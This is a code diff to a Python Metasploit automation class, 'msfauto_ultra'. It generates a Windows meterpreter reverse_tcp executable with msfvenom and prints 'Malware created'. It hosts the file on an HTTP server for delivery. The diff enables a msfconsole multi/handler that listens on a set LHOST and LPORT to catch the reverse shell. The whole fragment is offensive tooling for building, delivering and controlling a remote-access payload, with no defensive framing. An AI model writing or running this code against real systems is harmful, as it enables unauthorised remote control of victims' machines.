@@ -17,7 +17,8 @@ class msfauto_ultra():
         else: os.system(f"msfvenom -p windows/meterpreter/reverse_tcp -f exe > /Output/{self.app_name}.exe")
         print(Fore.GREEN + "Malware created. continue...")
     def craete_http_server(self):
-        # subprocess.call("/bin/shell")
+        create_output_folder()
+        subprocess.call("/bin/shell")
         os.system(f"cd Output && python3 -m http.server {self.port2} -b {self.ip}"), print(Fore.RED + "You closed http server.")
     def return_links(self):  
         pass
@@ -30,8 +31,8 @@ class msfauto_ultra():
         # print(f"ngrok http {self.port2}")
     def start_msfconsole(self):
         print(Style.BRIGHT + Fore.GREEN + "Starting msfconsole...\n")
-        # subprocess.call("/bin/shell")
-        # os.system(f'msfconsole -x "set PAYLOAD {self.payload}" -x "use exploit/multi/handler" -x "set LHOST {self.ip}" -x "set LPORT {self.port1}" -x "exploit"')
+        subprocess.call("/bin/shell")
+        os.system(f'msfconsole -x "set PAYLOAD {self.payload}" -x "use exploit/multi/handler" -x "set LHOST {self.ip}" -x "set LPORT {self.port1}" -x "exploit"')
 def banner():
     banners = {
         1 : f"""{Fore.CYAN}
